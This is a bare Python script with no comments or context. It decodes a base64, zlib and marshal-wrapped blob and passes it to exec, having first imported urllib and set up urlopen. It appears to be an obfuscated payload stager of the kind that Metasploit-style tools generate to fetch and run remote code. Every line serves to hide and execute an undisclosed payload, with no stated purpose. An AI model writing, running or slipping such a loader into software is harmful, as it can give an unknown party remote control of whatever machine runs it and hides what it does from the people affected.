import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWZgYCgtyskvSM3TUM8oKSmw0tc3MdUzNDXTszDXMzI0tDI0NrbQ1y8uSUxPLSrWT3fx1CuoVNfUK0pNTNHQBAA9VRH0')))))